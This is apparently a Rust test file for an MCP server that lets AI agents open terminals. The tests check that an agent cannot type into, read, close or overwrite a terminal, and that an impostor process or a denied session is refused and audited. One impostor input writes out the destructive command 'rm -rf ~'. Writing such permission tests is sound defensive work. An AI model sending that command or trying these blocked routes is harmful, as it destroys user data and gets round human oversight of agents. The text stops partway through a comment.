#[tokio::test]
async fn open_terminal_needs_no_confirmation_and_is_audited_as_opened_by_the_focus() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let mut rx = env.bcast.subscribe();
    let mut mcp = env.mcp(Some(TAG)).await;

    // The call returns by itself: nobody answers any sheet.
    let res = mcp.call("nostromo.open_terminal", json!({})).await;
    assert_eq!(res["ok"], true, "{res}");

    let broadcast = drain(&mut rx);
    assert!(
        !broadcast.iter().any(is_decision_request),
        "opening a local terminal must not ask the user anything: {broadcast:?}"
    );

    let opened = env.opened_lines();
    assert_eq!(opened.len(), 1, "{opened:?}");
    assert_eq!(opened[0]["requested_by"], "focus", "{}", opened[0]);
    assert_eq!(opened[0]["tag"], TAG, "{}", opened[0]);
    assert_eq!(
        opened[0]["terminal_id"], res["terminal_id"],
        "{}",
        opened[0]
    );
    assert_eq!(opened[0]["pane_id"], res["pane_id"], "{}", opened[0]);
}

#[tokio::test]
async fn open_terminal_from_an_unidentified_caller_or_an_unknown_focus_opens_nothing() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let tree_before = env.tree(TAG);
    let before = child_pids();

    // No pty_id in the Hello.
    let mut anonymous = env.mcp(None).await;
    let res = anonymous.call("nostromo.open_terminal", json!({})).await;
    assert_eq!(res["error"], "unknown_view", "{res}");

    // A pty_id that is no focus (no tree, no session).
    let mut stranger = env.mcp(Some("no-such-focus")).await;
    let res = stranger.call("nostromo.open_terminal", json!({})).await;
    assert_eq!(res["error"], "unknown_view", "{res}");

    assert!(env.all_terminals().is_empty());
    assert!(env.tree("no-such-focus").is_none(), "no tree is invented");
    assert_eq!(env.tree(TAG), tree_before);
    assert!(new_children(&before).is_empty(), "no process may start");
    assert!(env.opened_lines().is_empty());
}

// ═════════════════════════════════════════════════════════════════════════════
// C9: the tool list has no way to write input, keys, paste, signals
// ═════════════════════════════════════════════════════════════════════════════

#[tokio::test]
async fn tools_list_offers_open_terminal_with_exactly_one_argument_and_no_extras() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let mut mcp = env.mcp(Some(TAG)).await;

    let tools = mcp.list_tools().await;

    let tool = tools
        .iter()
        .find(|t| t["name"] == "nostromo.open_terminal")
        .expect("nostromo.open_terminal must be listed");
    let props = tool["inputSchema"]["properties"]
        .as_object()
        .expect("properties");
    assert_eq!(
        props.keys().collect::<Vec<_>>(),
        vec!["working_directory"],
        "the request surface may name a working directory and nothing else"
    );
    assert_eq!(tool["inputSchema"]["additionalProperties"], json!(false));
}

#[tokio::test]
async fn no_listed_tool_is_shaped_like_writing_to_reading_from_or_closing_a_terminal() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let mut mcp = env.mcp(Some(TAG)).await;

    let tools = mcp.list_tools().await;

    assert!(!tools.is_empty());
    for tool in &tools {
        let name = tool["name"].as_str().expect("tool name");
        assert_eq!(
            classify_terminal_attempt(name),
            None,
            "{name} looks like a terminal write/read/close tool"
        );
    }
}

#[tokio::test]
async fn no_terminal_or_shell_tool_takes_a_command_script_input_keys_or_data_argument() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let mut mcp = env.mcp(Some(TAG)).await;
    const FORBIDDEN: [&str; 10] = [
        "command",
        "cmd",
        "script",
        "args",
        "argv",
        "env",
        "input",
        "keys",
        "initial_input",
        "data",
    ];

    let tools = mcp.list_tools().await;

    let mut checked = 0;
    for tool in &tools {
        let name = tool["name"].as_str().expect("tool name");
        let lower = name.to_ascii_lowercase();
        if !(lower.contains("terminal") || lower.contains("shell")) {
            continue;
        }
        checked += 1;
        let props = tool["inputSchema"]["properties"]
            .as_object()
            .cloned()
            .unwrap_or_default();
        for key in props.keys() {
            assert!(
                !FORBIDDEN.contains(&key.as_str()),
                "{name} takes a `{key}` argument"
            );
        }
    }
    assert!(
        checked >= 1,
        "nostromo.open_terminal should have been checked"
    );
}

#[tokio::test]
async fn open_terminal_says_the_agent_cannot_type_into_read_from_or_close_the_terminal() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let mut mcp = env.mcp(Some(TAG)).await;

    let tools = mcp.list_tools().await;

    let description = tools
        .iter()
        .find(|t| t["name"] == "nostromo.open_terminal")
        .expect("listed")["description"]
        .as_str()
        .expect("description")
        .to_ascii_lowercase();
    assert!(
        description.contains("cannot") || description.contains("can't"),
        "{description}"
    );
    for verb in ["type", "read", "close"] {
        assert!(
            description.contains(verb),
            "the description must say the agent cannot {verb}: {description}"
        );
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// C10: attempts anyway are refused, audited, and change nothing
// ═════════════════════════════════════════════════════════════════════════════

#[tokio::test]
async fn made_up_tool_names_that_write_read_or_close_a_terminal_are_refused_audited_and_change_nothing(
) {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let live_id = live.id().to_string();

    for (name, op) in [
        ("nostromo_terminal_input", "input"),
        ("nostromo_send_keys", "input"),
        ("terminal_write", "input"),
        ("nostromo_paste_to_shell", "input"),
        ("nostromo_terminal_signal", "input"),
        ("nostromo_close_terminal", "close"),
        ("nostromo_read_terminal_output", "read"),
    ] {
        let since = live.app.mark();
        let resp = live
            .mcp
            .call_raw(
                name,
                json!({"terminal_id": live_id, "data": "aGk=", "text": "hi\n"}),
            )
            .await;

        // A distinct error: not "unknown tool", not "withdrawn by policy".
        assert_eq!(
            resp["error"]["code"],
            json!(TERMINAL_FORBIDDEN_CODE),
            "{name}: {resp}"
        );
        assert_eq!(TERMINAL_FORBIDDEN_CODE, -32002);
        let message = resp["error"]["message"].as_str().unwrap_or_default();
        assert!(
            message.starts_with(&format!("terminal_{op}_forbidden")) && message.contains(name),
            "{name}: unexpected message {message:?}"
        );

        // Audited with the calling focus.
        live.env
            .refusal(op, name, &format!("terminal_{op}_forbidden"))
            .await;

        live.assert_unchanged(since, name).await;
    }
    live.prove_responsive().await;
}

#[tokio::test]
async fn raw_terminal_frames_on_the_mcp_socket_are_refused_audited_and_change_nothing() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let live_id = live.id().to_string();

    // A daemon-protocol frame (no jsonrpc key) typed at the agent's socket.
    let since = live.app.mark();
    live.mcp
        .send(&json!({"type": "terminal_input", "terminal_id": live_id, "bytes": "aGk="}))
        .await;
    let resp = live.mcp.recv().await;
    assert_eq!(
        resp["error"]["code"],
        json!(TERMINAL_FORBIDDEN_CODE),
        "{resp}"
    );
    assert!(
        resp["error"]["message"]
            .as_str()
            .unwrap_or_default()
            .starts_with("terminal_input_forbidden"),
        "{resp}"
    );
    live.env
        .refusal("input", "terminal_input", "terminal_input_forbidden")
        .await;
    live.assert_unchanged(since, "raw terminal_input frame")
        .await;

    // A JSON-RPC request in a terminal method namespace.
    let since = live.app.mark();
    live.mcp
        .send(&json!({"jsonrpc": "2.0", "id": 9, "method": "terminal/input", "params": {}}))
        .await;
    let resp = live.mcp.recv().await;
    assert_eq!(resp["id"], json!(9), "{resp}");
    assert_eq!(
        resp["error"]["code"],
        json!(TERMINAL_FORBIDDEN_CODE),
        "{resp}"
    );
    assert!(
        resp["error"]["message"]
            .as_str()
            .unwrap_or_default()
            .starts_with("terminal_input_forbidden"),
        "{resp}"
    );
    live.env
        .refusal("input", "terminal/input", "terminal_input_forbidden")
        .await;
    live.assert_unchanged(since, "terminal/input request").await;

    // The audit trail names who tried, never what they tried to type.
    let audit = std::fs::read_to_string(&live.env.audit_path).expect("audit file");
    assert!(
        !audit.contains("aGk=") && !audit.contains("\"hi\""),
        "the audit trail must not contain keystrokes: {audit}"
    );
    live.prove_responsive().await;
}

#[tokio::test]
async fn a_plain_unknown_tool_name_is_still_method_not_found() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let mut mcp = env.mcp(Some(TAG)).await;

    let resp = mcp.call_raw("nostromo.no_such_tool", json!({})).await;

    assert_eq!(resp["error"]["code"], json!(-32601), "{resp}");
    assert!(
        !env.audit().iter().any(|l| l["event"] == "refused"),
        "an ordinary unknown tool is not a terminal refusal"
    );
}

#[tokio::test]
async fn a_process_that_only_claims_to_be_the_app_cannot_type_attach_or_close_and_is_audited() {
    let _turn = serial().await;
    // Connection 0 is the verified app; connection 1 claims `mac_app` but is,
    // as far as the verifier can tell, an ordinary local process (an agent's Bash).
    let mut live = Live::start().await;
    let mut impostor =
        Ipc::connect(&live.env.ipc_sock, Some("mac_app"), vec![Topic::Terminal]).await;
    assert!(
        impostor.nonce.is_none(),
        "an unverified peer gets no operator nonce"
    );
    let live_id = live.id().to_string();

    for (msg, op, code) in [
        (
            ClientMsg::TerminalInput {
                terminal_id: live_id.clone(),
                bytes: B64.encode("rm -rf ~\r"),
            },
            "input",
            "terminal_input_forbidden",
        ),
        (
            ClientMsg::TerminalAttach {
                terminal_id: live_id.clone(),
            },
            "attach",
            "terminal_read_forbidden",
        ),
        (
            ClientMsg::TerminalClose {
                terminal_id: live_id.clone(),
            },
            "close",
            "terminal_close_forbidden",
        ),
    ] {
        let since = live.app.mark();
        let from = impostor.mark();
        impostor.send(&msg).await;
        let refused = impostor
            .wait_for(
                from,
                &format!("terminal_refused for {op}"),
                |m| matches!(m, ServerMsg::TerminalRefused { op: o, .. } if o == op),
            )
            .await;
        match refused {
            ServerMsg::TerminalRefused {
                terminal_id,
                code: c,
                ..
            } => {
                assert_eq!(c, code, "{op}");
                assert_eq!(terminal_id.as_deref(), Some(live_id.as_str()), "{op}");
            }
            other => panic!("unexpected {other:?}"),
        }
        assert!(
            impostor.bytes_since(from, &live_id).is_empty(),
            "{op}: the impostor must receive no terminal bytes"
        );
        live.env
            .audit_line(&format!("an ipc refusal of {op}"), |l| {
                l["event"] == "refused" && l["channel"] == "ipc" && l["op"] == op
            })
            .await;
        live.assert_unchanged(since, op).await;
    }
    live.prove_responsive().await;
}

// ═════════════════════════════════════════════════════════════════════════════
// C11: layout and content calls cannot remove, replace or overwrite a terminal
// ═════════════════════════════════════════════════════════════════════════════

#[tokio::test]
async fn reset_panes_is_refused_while_a_terminal_is_live() {
    let _turn = serial().await;
    let mut live = Live::start().await;

    live.assert_protected("nostromo.reset_panes", json!({}), "layout")
        .await;

    live.prove_responsive().await;
}

#[tokio::test]
async fn set_pane_layout_with_a_replacement_tree_that_drops_the_terminal_is_refused() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let replacement = json!({
        "kind": "split",
        "direction": "horizontal",
        "children": [
            {"kind": "leaf", "pane_id": "repl"},
            {"kind": "leaf", "pane_id": "notes"}
        ],
        "ratios": [0.5, 0.5]
    });

    live.assert_protected(
        "nostromo.set_pane_layout",
        json!({"view_id": TAG, "ratios": replacement}),
        "layout",
    )
    .await;

    live.prove_responsive().await;
}

#[tokio::test]
async fn apply_layout_with_an_inline_tree_that_drops_the_terminal_is_refused() {
    let _turn = serial().await;
    let mut live = Live::start().await;

    live.assert_protected(
        "nostromo.apply_layout",
        json!({
            "tree": {
                "direction": "horizontal",
                "ratios": [0.5, 0.5],
                "children": [{"pane": "repl"}, {"pane": "notes"}]
            },
            "panes": {"notes": {"content_kind": "text"}}
        }),
        "layout",
    )
    .await;

    live.prove_responsive().await;
}

#[tokio::test]
async fn set_pane_content_aimed_at_the_terminal_pane_is_refused_and_paints_nothing() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let pane = live.pane().to_string();

    live.assert_protected(
        "nostromo.set_pane_content",
        json!({
            "view_id": TAG,
            "pane_id": pane,
            "content": {"type": "text", "text": "overwritten by the agent"}
        }),
        "content",
    )
    .await;

    live.prove_responsive().await;
}

#[tokio::test]
async fn refresh_pane_content_aimed_at_the_terminal_pane_is_refused_and_binds_no_source() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let pane = live.pane().to_string();

    live.assert_protected(
        "nostromo.refresh_pane_content",
        json!({"pane_id": pane, "source": "perri.get_current_pr", "placeholder": "none"}),
        "content",
    )
    .await;

    assert!(
        live.env
            .panes
            .lock()
            .unwrap()
            .binding_for(TAG, &pane)
            .is_none(),
        "a refused refresh must not bind a data source to the terminal pane"
    );
    live.prove_responsive().await;
}

#[tokio::test]
async fn apply_layout_that_declares_the_terminal_pane_as_a_content_pane_is_refused() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let pane = live.pane().to_string();

    // The tree keeps the terminal leaf; it is the `panes` binding that would
    // overwrite what the pane shows.
    live.assert_protected(
        "nostromo.apply_layout",
        json!({
            "tree": {
                "direction": "vertical",
                "ratios": [0.5, 0.5],
                "children": [{"pane": "repl"}, {"pane": pane}]
            },
            "panes": {pane.clone(): {"content_kind": "text", "placeholder": "agent text"}}
        }),
        "content",
    )
    .await;

    live.prove_responsive().await;
}

#[tokio::test]
async fn show_beside_a_live_terminal_succeeds_and_leaves_the_terminal_pane_and_process_alone() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let since = live.app.mark();

    let res = live
        .mcp
        .call("nostromo.show", json!({"type": "review_queue"}))
        .await;

    assert_eq!(
        res["ok"], true,
        "show must still work beside a terminal: {res}"
    );
    assert_eq!(res["region"], "detail", "{res}");
    let ids = live.env.pane_ids(TAG);
    assert!(ids.iter().any(|p| p == "queue"), "{ids:?}");
    live.assert_unchanged(since, "nostromo.show").await;
    live.prove_responsive().await;
}

#[tokio::test]
async fn ratio_only_layout_changes_are_allowed_beside_a_live_terminal() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let pane = live.pane().to_string();
    let since = live.app.mark();

    let res = live
        .mcp
        .call(
            "nostromo.set_pane_layout",
            json!({"view_id": TAG, "ratios": {pane.clone(): 0.3, "repl": 0.7}}),
        )
        .await;

    assert_eq!(res["ok"], true, "{res}");
    let tree = live.env.tree(TAG).expect("tree");
    let got = ratio_of(&tree, &pane).expect("the terminal leaf sits in a split");
    assert!(
        (got - 0.3).abs() < 0.01,
        "ratio of the terminal pane: {got}"
    );
    live.assert_unchanged(since, "ratio map").await;
    live.prove_responsive().await;
}

#[tokio::test]
async fn a_replacement_tree_that_keeps_the_terminal_leaf_is_allowed() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let pane = live.pane().to_string();
    let since = live.app.mark();

    // Through set_pane_layout: the same panes, new proportions and a new pane.
    let tree = json!({
        "kind": "split",
        "direction": "vertical",
        "children": [
            {"kind": "leaf", "pane_id": "repl"},
            {"kind": "split", "direction": "horizontal", "children": [
                {"kind": "leaf", "pane_id": pane},
                {"kind": "leaf", "pane_id": "notes"}
            ], "ratios": [0.6, 0.4]}
        ],
        "ratios": [0.4, 0.6]
    });
    let res = live
        .mcp
        .call(
            "nostromo.set_pane_layout",
            json!({"view_id": TAG, "ratios": tree}),
        )
        .await;
    assert_eq!(res["ok"], true, "{res}");
    let ids = live.env.pane_ids(TAG);
    assert!(ids.iter().any(|p| p == "notes"), "{ids:?}");

    // And through apply_layout.
    let res = live
        .mcp
        .call(
            "nostromo.apply_layout",
            json!({
                "tree": {
                    "direction": "horizontal",
                    "ratios": [0.5, 0.5],
                    "children": [{"pane": "repl"}, {"pane": pane}]
                }
            }),
        )
        .await;
    assert_eq!(res["ok"], true, "{res}");
    assert_eq!(live.env.pane_ids(TAG).len(), 2);

    live.assert_unchanged(since, "layouts that keep the terminal")
        .await;
    live.prove_responsive().await;
}

// ── reserved pane ids ────────────────────────────────────────────────────────

#[tokio::test]
async fn create_pane_cannot_mint_a_terminal_pane_id() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let mut mcp = env.mcp(Some(TAG)).await;
    let tree_before = env.tree(TAG);

    let res = mcp
        .call(
            "nostromo.create_pane",
            json!({"pane_id": "terminal-deadbeef", "position": "split_right", "relative_to": "repl"}),
        )
        .await;

    assert_eq!(res["error"], "reserved_pane_id", "{res}");
    assert_eq!(env.tree(TAG), tree_before);
}

#[tokio::test]
async fn a_replacement_tree_cannot_forge_an_unregistered_terminal_pane() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let mut mcp = env.mcp(Some(TAG)).await;
    let tree_before = env.tree(TAG);

    let res = mcp
        .call(
            "nostromo.set_pane_layout",
            json!({"view_id": TAG, "ratios": {
                "kind": "split",
                "direction": "horizontal",
                "children": [
                    {"kind": "leaf", "pane_id": "repl"},
                    {"kind": "leaf", "pane_id": "terminal-cafe0001"}
                ],
                "ratios": [0.5, 0.5]
            }}),
        )
        .await;
    assert_eq!(res["error"], "reserved_pane_id", "set_pane_layout: {res}");

    let res = mcp
        .call(
            "nostromo.apply_layout",
            json!({"tree": {
                "direction": "horizontal",
                "ratios": [0.5, 0.5],
                "children": [{"pane": "repl"}, {"pane": "terminal-cafe0001"}]
            }}),
        )
        .await;
    assert_eq!(res["error"], "reserved_pane_id", "apply_layout: {res}");

    assert_eq!(env.tree(TAG), tree_before, "the tree must be unchanged");
    assert!(env.terminal_leaves(TAG).is_empty());
}

// ═════════════════════════════════════════════════════════════════════════════
// C12: only the user closes a terminal
// ═════════════════════════════════════════════════════════════════════════════

#[tokio::test]
async fn the_users_close_kills_the_shell_removes_the_pane_and_ends_the_protection() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let (id, pane, pid) = (live.id().to_string(), live.pane().to_string(), live.pid);

    // The agent can neither close it nor re-lay out around it ...
    live.assert_protected("nostromo.reset_panes", json!({}), "layout")
        .await;

    // ... the user (a verified operator connection) can.
    let from = live.app.mark();
    live.app
        .send(&ClientMsg::TerminalClose {
            terminal_id: id.clone(),
        })
        .await;
    live.app
        .wait_for(
            from,
            "terminal_closed",
            |m| matches!(m, ServerMsg::TerminalClosed(c) if c.terminal_id == id),
        )
        .await;

    eventually("the shell process to be gone", || {
        !my_children().iter().any(|p| p.pid == pid)
    })
    .await;
    assert!(live.env.all_terminals().is_empty());
    assert!(live.env.terminal_leaves(TAG).is_empty());
    assert!(
        !live.env.pane_ids(TAG).iter().any(|p| p == &pane),
        "the closed terminal's pane must leave the tree"
    );
    live.env
        .audit_line("the close", |l| {
            l["event"] == "closed" && l["terminal_id"] == json!(id) && l["reason"] == "user_closed"
        })
        .await;

    // With no live terminal left there is nothing to protect.
    let res = live.mcp.call("nostromo.reset_panes", json!({})).await;
    assert_eq!(res["ok"], true, "{res}");
}

fn focus_meta(tag: &str) -> FocusMeta {
    FocusMeta {
        initial_model: None,
        initial_effort: None,
        tag: tag.to_string(),
        display_name: tag.to_string(),
        agent_name: "cody".to_string(),
        project_name: None,
        org: None,
        is_built_in: false,
        session_summary: None,
        label: None,
        project_path: None,
        select_for_client: None,
    }
}

#[tokio::test]
async fn when_the_user_removes_a_focus_its_terminal_is_closed_and_other_focuses_terminals_are_not()
{
    const OTHER: &str = "cody-term-other";
    let _turn = serial().await;
    let mut live = Live::start().await;
    let (id, pane, pid) = (live.id().to_string(), live.pane().to_string(), live.pid);

    // Another focus with its own live terminal, which must be left alone.
    live.env.init_focus(OTHER);
    let mut other = live.env.mcp(Some(OTHER)).await;
    let before = child_pids();
    let res = other.call("nostromo.open_terminal", json!({})).await;
    assert_eq!(res["ok"], true, "{res}");
    let other_id = res["terminal_id"]
        .as_str()
        .expect("terminal_id")
        .to_string();
    let other_pane = res["pane_id"].as_str().expect("pane_id").to_string();
    let other_pid = the_new_shell(&before).await;

    // The app pushes its focus registry; a focus counts as departed only once it
    // is absent from two consecutive pushes after having been in one.
    let from = live.app.mark();
    live.app
        .send(&ClientMsg::FocusRegistryPush {
            focuses: vec![focus_meta(TAG), focus_meta(OTHER)],
        })
        .await;
    live.app.sync().await;
    for round in 0..2 {
        live.app
            .send(&ClientMsg::FocusRegistryPush {
                focuses: vec![focus_meta(OTHER)],
            })
            .await;
        live.app.sync().await;
        if round == 0 {
            // Absent once is not enough: the shell must still be there.
            tokio::time::sleep(QUIET).await;
            assert!(
                is_alive(pid),
                "a focus missing from one push is not yet gone"
            );
            assert!(live.env.info(&id).is_some());
        }
    }

    // Now it is gone, and its terminal went with it.
    live.app
        .wait_for(from, "terminal_closed for the removed focus", |m| {
            matches!(m, ServerMsg::TerminalClosed(c)
                if c.terminal_id == id && c.reason == "focus_removed")
        })
        .await;
    eventually("the removed focus's shell process to be gone", || {
        !my_children().iter().any(|p| p.pid == pid)
    })
    .await;
    assert!(live.env.info(&id).is_none(), "the terminal is still known");
    assert!(
        live.env.all_terminals().iter().all(|t| t.terminal_id != id),
        "the terminal is still listed"
    );
    assert!(live.env.terminal_leaves(TAG).is_empty());
    assert!(
        !live.env.pane_ids(TAG).iter().any(|p| p == &pane),
        "the leaf is still in the removed focus's tree"
    );
    live.env
        .audit_line("a focus_removed close", |l| {
            l["event"] == "closed"
                && l["terminal_id"] == json!(id)
                && l["reason"] == "focus_removed"
        })
        .await;

    // The other focus's terminal is untouched.
    assert!(is_alive(other_pid));
    assert_eq!(
        live.env.info(&other_id).map(|t| t.status),
        Some(TerminalStatus::Running)
    );
    assert_eq!(live.env.terminal_leaves(OTHER), vec![other_pane.clone()]);
    assert!(live.env.pane_ids(OTHER).contains(&other_pane));

    // A new focus under the same tag starts unprotected.
    live.env.init_focus(TAG);
    let mut again = live.env.mcp(Some(TAG)).await;
    let res = again.call("nostromo.reset_panes", json!({})).await;
    assert_eq!(res["ok"], true, "{res}");
}

#[tokio::test]
async fn an_ordinary_local_process_cannot_remove_a_focus_to_take_its_terminal_with_it() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let (id, pane, pid) = (live.id().to_string(), live.pane().to_string(), live.pid);
    let mut impostor =
        Ipc::connect(&live.env.ipc_sock, Some("mac_app"), vec![Topic::Terminal]).await;
    assert!(impostor.nonce.is_none(), "an unverified peer gets no nonce");

    // The focus is known (the app pushed it), then an agent's script pushes a
    // registry that lacks it, twice (an empty push is no evidence of removal).
    live.app
        .send(&ClientMsg::FocusRegistryPush {
            focuses: vec![focus_meta(TAG)],
        })
        .await;
    live.app.sync().await;
    for _ in 0..2 {
        impostor
            .send(&ClientMsg::FocusRegistryPush {
                focuses: vec![focus_meta("decoy")],
            })
            .await;
        impostor.sync().await;
    }

    live.env
        .audit_line("an ipc refusal of close", |l| {
            l["event"] == "refused" && l["channel"] == "ipc" && l["op"] == "close"
        })
        .await;
    tokio::time::sleep(QUIET).await;
    assert!(is_alive(pid), "the shell must survive");
    assert!(live.env.info(&id).is_some(), "the terminal is still known");
    assert_eq!(live.env.terminal_leaves(TAG), vec![pane.clone()]);
    assert!(
        live.env.pane_ids(TAG).contains(&pane),
        "the leaf is still there"
    );
    live.prove_responsive().await;
}

// ═════════════════════════════════════════════════════════════════════════════
// B1: who may call nostromo.open_terminal at all
// ═════════════════════════════════════════════════════════════════════════════

const OPEN_TERMINAL: &str = "nostromo.open_terminal";
/// A second, ordinary agent focus.
const PLAIN: &str = "cody-term-plain";

/// A directory that exists and whose path can be found in a file by searching
/// for its distinctive prefix: a refusal that leaked its arguments into the
/// audit trail would show it.
const DISTINCT_PREFIX: &str = "redd-distinct-cwd-";

fn distinctive_dir() -> TempDir {
    tempfile::Builder::new()
        .prefix(DISTINCT_PREFIX)
        .tempdir()
        .expect("tempdir")
}

/// What "nothing happened" is measured against: the trees of the focuses the
/// call could have touched, and the child processes at that moment.
struct Baseline {
    trees: Vec<(String, Option<PaneTree>)>,
    children: BTreeSet<u32>,
}

impl Baseline {
    fn take(env: &Env, tags: &[&str]) -> Baseline {
        Baseline {
            trees: tags.iter().map(|t| (t.to_string(), env.tree(t))).collect(),
            children: child_pids(),
        }
    }

    /// No terminal, no leaf, no tree change, no new process, no `opened` line.
    fn assert_nothing_happened(&self, env: &Env, what: &str) {
        assert!(
            env.all_terminals().is_empty(),
            "{what}: a terminal was created"
        );
        for (tag, tree) in &self.trees {
            assert!(
                env.terminal_leaves(tag).is_empty(),
                "{what}: a terminal leaf was registered in {tag}"
            );
            assert_eq!(&env.tree(tag), tree, "{what}: the tree of {tag} changed");
        }
        assert!(
            new_children(&self.children).is_empty(),
            "{what}: a process started"
        );
        assert!(
            env.opened_lines().is_empty(),
            "{what}: an `opened` audit line was written"
        );
    }
}

/// The refusal of `nostromo.open_terminal` as the agent sees it (a JSON-RPC
/// `Forbidden`, -32001) and as the audit trail records it: one `refused` line,
/// channel `mcp`, op `open`, code `forbidden`, naming the tool and the calling
/// `focus`, and carrying nothing the caller passed.
async fn assert_open_refused_as_forbidden(env: &Env, resp: &Value, focus: &str, secret: &str) {
    assert_eq!(
        resp["error"]["code"],
        json!(TOOL_FORBIDDEN_CODE),
        "expected a Forbidden error: {resp}"
    );
    assert_eq!(TOOL_FORBIDDEN_CODE, -32001);
    assert!(
        resp["error"]["message"]
            .as_str()
            .unwrap_or_default()
            .contains(OPEN_TERMINAL),
        "{resp}"
    );

    let line = env
        .audit_line("the refused open_terminal", |l| {
            l["event"] == "refused" && l["channel"] == "mcp" && l["tool"] == OPEN_TERMINAL
        })
        .await;
    assert_eq!(line["op"], "open", "{line}");
    assert_eq!(line["code"], "forbidden", "{line}");
    assert_eq!(
        line["focus"], focus,
        "the refusal must name the calling focus: {line}"
    );
    assert_content_free(env, &line, secret);
    let refused: Vec<Value> = env
        .audit()
        .into_iter()
        .filter(|l| l["event"] == "refused" && l["tool"] == OPEN_TERMINAL)
        .collect();
    assert_eq!(refused.len(), 1, "exactly one refusal line: {refused:?}");
}

/// The line and the whole audit file carry none of what the caller passed.
fn assert_content_free(env: &Env, line: &Value, secret: &str) {
    for key in ["working_directory", "arguments", "args", "cwd"] {
        assert!(line.get(key).is_none(), "{key} in a refusal line: {line}");
    }
    let audit = std::fs::read_to_string(&env.audit_path).unwrap_or_default();
    assert!(
        !audit.contains(secret) && !audit.contains(DISTINCT_PREFIX),
        "the audit trail must not contain the working_directory the caller passed: {audit}"
    );
}

/// An operator's `~/.nostromo/tool-policy.yaml` (under the private `$HOME`),
/// removed again when this drops, panic or not.
struct PolicyFile(PathBuf);

impl PolicyFile {
    fn arm(yaml: &str) -> PolicyFile {
        let path = nostromo::mcp::tool_policy::policy_path();
        assert!(
            path.starts_with(home_path()),
            "the policy file must be under the private $HOME, not {}",
            path.display()
        );
        std::fs::create_dir_all(path.parent().unwrap()).expect("create ~/.nostromo");
        let guard = PolicyFile(path.clone());
        std::fs::write(&path, yaml).expect("write the policy");
        guard
    }
}

impl Drop for PolicyFile {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.0);
    }
}

const DENY_OPEN_TERMINAL_TO_CODY: &str =
    "agents:\n  cody:\n    deny:\n      - nostromo.open_terminal\n";

fn lists_open_terminal(tools: &[Value]) -> bool {
    tools.iter().any(|t| t["name"] == OPEN_TERMINAL)
}

#[tokio::test]
async fn open_terminal_is_refused_audited_and_hidden_for_a_network_driven_session() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    env.init_focus(PLAIN);
    env.session_mgr
        .lock()
        .unwrap()
        .sensitive_tags()
        .mark_network_driven(TAG);
    let mut driven = env.mcp(Some(TAG)).await;
    let mut plain = env.mcp(Some(PLAIN)).await;
    let work = distinctive_dir();
    let secret = work.path().to_string_lossy().into_owned();

    // The tool is not offered to the steered session, and is to an ordinary one.
    assert!(
        !lists_open_terminal(&driven.list_tools().await),
        "a network-driven session must not be offered open_terminal"
    );
    assert!(
        lists_open_terminal(&plain.list_tools().await),
        "an ordinary agent session is offered open_terminal"
    );

    // Calling it by name anyway is refused.
    let baseline = Baseline::take(&env, &[TAG, PLAIN]);
    let resp = driven
        .call_raw(OPEN_TERMINAL, json!({"working_directory": secret}))
        .await;

    assert_open_refused_as_forbidden(&env, &resp, TAG, &secret).await;
    baseline.assert_nothing_happened(&env, "network-driven open_terminal");
}

#[tokio::test]
async fn open_terminal_is_refused_and_audited_for_the_picks_session_which_has_no_focus() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    // Nothing is initialised for the picks tag: it is no focus, so an
    // `unknown_view` answer would be the wrong reason to refuse.
    assert!(env.tree(PICKS_TAG).is_none(), "harness: picks has no focus");
    let mut picks = env.mcp(Some(PICKS_TAG)).await;
    let work = distinctive_dir();
    let secret = work.path().to_string_lossy().into_owned();
    let baseline = Baseline::take(&env, &[PICKS_TAG]);

    assert!(
        !lists_open_terminal(&picks.list_tools().await),
        "the picks session is offered its own tools only"
    );
    let resp = picks
        .call_raw(OPEN_TERMINAL, json!({"working_directory": secret}))
        .await;

    assert_open_refused_as_forbidden(&env, &resp, PICKS_TAG, &secret).await;
    baseline.assert_nothing_happened(&env, "picks open_terminal");
}

#[tokio::test]
async fn open_terminal_is_refused_and_audited_for_an_agent_the_operators_policy_denies_it() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    // The focus is known to the daemon as an agent named `cody`.
    env.session_mgr
        .lock()
        .unwrap()
        .set_focus_registry(vec![focus_meta(TAG)]);
    let _policy = PolicyFile::arm(DENY_OPEN_TERMINAL_TO_CODY);
    let mut restricted = env.mcp(Some(TAG)).await;
    let work = distinctive_dir();
    let secret = work.path().to_string_lossy().into_owned();
    let baseline = Baseline::take(&env, &[TAG]);

    assert!(
        !lists_open_terminal(&restricted.list_tools().await),
        "harness: the policy must be in force for this agent"
    );
    let resp = restricted
        .call_raw(OPEN_TERMINAL, json!({"working_directory": secret}))
        .await;

    assert_open_refused_as_forbidden(&env, &resp, TAG, &secret).await;
    baseline.assert_nothing_happened(&env, "policy-denied open_terminal");
}

#[tokio::test]
async fn a_mother_worker_with_no_focus_gets_unknown_view_from_open_terminal_and_nothing_opens() {
    // A Mother worker is spawned by Mother, outside any Nostromo focus, so it
    // has no NOSTROMO_PTY_ID. The MCP bridge then sends `pty_id: ""` (or none).
    // That is the only way such a session reaches this surface: it is never
    // `forbidden`, it simply has no focus to open a terminal in.
